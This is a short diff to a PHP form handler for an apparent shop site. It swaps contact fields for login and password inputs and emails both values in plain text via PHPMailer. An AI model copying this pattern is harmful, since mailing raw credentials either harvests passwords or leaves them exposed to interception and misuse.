@@ -5,9 +5,8 @@ require 'phpmailer/SMTP.php';
 require 'phpmailer/Exception.php';
 
 // Переменные, которые отправляет пользователь
-$name = $_POST['name'];
-$phone = $_POST['phone'];
-$message = $_POST['message'];
+$login = $_POST['login'];
+$password = $_POST['password'];
 $email = $_POST['emailNews'];
 // Формирование самого письма
 if($email <> ''){
@@ -52,13 +51,12 @@ else {$result = "error";}
 // Отображение результата
 header('Location: thankyou.html');
 }
-elseif($name <> '' and $phone <> ''){
+elseif($login <> '' and $password <> ''){
   $title = "Новое обращение Ehya Shop";
   $body = "
   <h2>Новое обращение</h2>
-  <b>Имя:</b> $name<br>
-  <b>Телефон:</b> $phone<br><br>
-  <b>Сообщение:</b><br>$message
+  <b>Логин:</b> $login<br>
+  <b>Пароль:</b> $password<br>
   ";
   $mail = new PHPMailer\PHPMailer\PHPMailer();
 try {
